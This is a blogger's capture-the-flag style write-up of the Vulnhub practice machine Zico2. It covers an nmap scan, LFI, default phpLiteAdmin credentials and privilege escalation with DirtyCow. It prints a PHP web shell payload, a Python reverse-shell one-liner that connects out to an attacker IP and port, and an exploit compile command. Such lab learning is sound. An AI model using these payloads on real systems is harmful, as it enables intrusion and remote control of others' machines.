---
layout: default
title : muzec - Zico2 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117451151-23ce6b00-af10-11eb-8417-a95f64436697.png)

So i was also hitting all the OSCP like Box on Vulnhubs Damn guys guess what?? am really getting my A** kick like a lot lol so let get started today the box is Zico2 which can be easily download here `https://www.vulnhub.com/entry/zico2-1,210/` .

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu May  6 15:40:41 2021 as: nmap -p- -sC -sV -oA nmap 172.16.139.170
Nmap scan report for 172.16.139.170
Host is up (0.00020s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35483/udp6  status
|   100024  1          35727/udp   status
|   100024  1          49061/tcp   status
|_  100024  1          52842/tcp6  status
49061/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  6 15:40:59 2021 -- 1 IP address (1 host up) scanned in 18.38 seconds
```

4 open ports we already know we are hitting port 80 first let see what we have on the web page.

![image](https://user-images.githubusercontent.com/69868171/117451151-23ce6b00-af10-11eb-8417-a95f64436697.png)

Looking around we found a page with a LFI vulnerability.

![image](https://user-images.githubusercontent.com/69868171/117452058-5167e400-af11-11eb-8a8e-3ed65ebdcf75.png)

Not going to lie i spend hours trying to get it from LFI to RCE but no luck so i decided to burst some directory.

![image](https://user-images.githubusercontent.com/69868171/117455282-0a7bed80-af15-11eb-96be-ff3a6fdfb7c8.png)

And `http://172.16.139.170/dbadmin/` look interesting let check it out.

![image](https://user-images.githubusercontent.com/69868171/117455487-3a2af580-af15-11eb-9f6c-1f0edf3af6ab.png)

So i click on test_db.php.

![image](https://user-images.githubusercontent.com/69868171/117455586-575fc400-af15-11eb-84ab-2186e616a9c1.png)

And boom a phpLiteAdmin admin page a quick google search give us the default password to log in.

![image](https://user-images.githubusercontent.com/69868171/117455772-7fe7be00-af15-11eb-94cf-8ff9298e99d2.png)

Let try using it to log in.

![image](https://user-images.githubusercontent.com/69868171/117456109-da811a00-af15-11eb-8bb0-aabb49d45ea9.png)

Boom we have access to the phpLiteAdmin admin page and also found some sweet credentials.

![image](https://user-images.githubusercontent.com/69868171/117456239-f97fac00-af15-11eb-804f-0e1a3ee6ab34.png)

So i cracl it thinking it the way to get acess to SSH but nop just a rabbit hole.

![image](https://user-images.githubusercontent.com/69868171/117456407-246a0000-af16-11eb-9fb3-97210a0fa3b0.png)

So back to the phpLiteAdmin admin page since we know the version i try checking for any available exploit using searchsploit.

![image](https://user-images.githubusercontent.com/69868171/117456604-62ffba80-af16-11eb-922e-8bf03c85053f.png)

Hmm the Remote PHP Code Injection look interesting since it match our version.

![image](https://user-images.githubusercontent.com/69868171/117456802-9b9f9400-af16-11eb-9c44-1a4ccdc3ebc5.png)

Ok let follow it.

![image](https://user-images.githubusercontent.com/69868171/117456936-beca4380-af16-11eb-900d-543f72c14632.png)

Now let click on the new created database.

![image](https://user-images.githubusercontent.com/69868171/117457051-dc97a880-af16-11eb-82a8-9576631ea4e0.png)

![image](https://user-images.githubusercontent.com/69868171/117457161-f6d18680-af16-11eb-9036-9e110ee4d411.png)

Now let create a table for it.

![image](https://user-images.githubusercontent.com/69868171/117457800-9a229b80-af17-11eb-8b07-789cb1a474c9.png)

Default Value `<?php echo system($_GET["cmd"]); ?>` and click on create.

![image](https://user-images.githubusercontent.com/69868171/117457981-c9390d00-af17-11eb-8727-42dd8599617e.png)

Now going back to the LFI page to access it.

![image](https://user-images.githubusercontent.com/69868171/117458102-ea016280-af17-11eb-9dbd-3a6e90ec7a65.png)

AHhhh nice adding our parameter to the back boom we have command injection.

![image](https://user-images.githubusercontent.com/69868171/117458218-0ac9b800-af18-11eb-88b9-b5e61cdf09e7.png)

Now let get a reverse shell back to our terminal. [Reverse Shell Cheat Sheet][https://muzec0318.github.io/posts/ReverseShell.html] 

we be using the python reverse shell script `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Note:- do change the IP and port also start an Ncat listener.

![image](https://user-images.githubusercontent.com/69868171/117458539-66944100-af18-11eb-9c66-3202fd946b5f.png)

And we have shell.

![image](https://user-images.githubusercontent.com/69868171/117458735-9c392a00-af18-11eb-8d24-a295754a0e0c.png)

let Spawn a TTY shell. [Spawning A TTY Shell][https://muzec0318.github.io/posts/Ttyshells.html]

![image](https://user-images.githubusercontent.com/69868171/117458926-cdb1f580-af18-11eb-84df-9287abda3f4e.png)

### Privilege Escalation

First thing to check was the version.

![image](https://user-images.githubusercontent.com/69868171/117458997-e4584c80-af18-11eb-8456-aafbad304677.png)

Yea it pretty Old so i run linux-exploit-suggester to find some exploit.

![image](https://user-images.githubusercontent.com/69868171/117459988-01414f80-af1a-11eb-8b6b-2dc652bed2d8.png)

Cool dirtycow 2 so i download the exploit to my machine and transfer it to the target box.

![image](https://user-images.githubusercontent.com/69868171/117460269-5715f780-af1a-11eb-8086-9b54eb9bcca3.png)

Now let complie and run the exploit.

`gcc -pthread 40839.c -o dirty -lcrypt`

![image](https://user-images.githubusercontent.com/69868171/117460506-95131b80-af1a-11eb-869c-99967f674b17.png)

![image](https://user-images.githubusercontent.com/69868171/117460545-9fcdb080-af1a-11eb-87fd-db7451785256.png)

Now let run it.

![image](https://user-images.githubusercontent.com/69868171/117461691-d8ba5500-af1b-11eb-89a3-62f43aeeb734.png)

![image](https://user-images.githubusercontent.com/69868171/117461766-eec81580-af1b-11eb-85a2-60d2c20efbb6.png)

And we are root...

![image](https://user-images.githubusercontent.com/69868171/117461922-1a4b0000-af1c-11eb-9b8c-02a1291c006f.png)

*GOT STUCK A LOT BUT GUESS WHAT WE LEARN EVERYDAY*

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
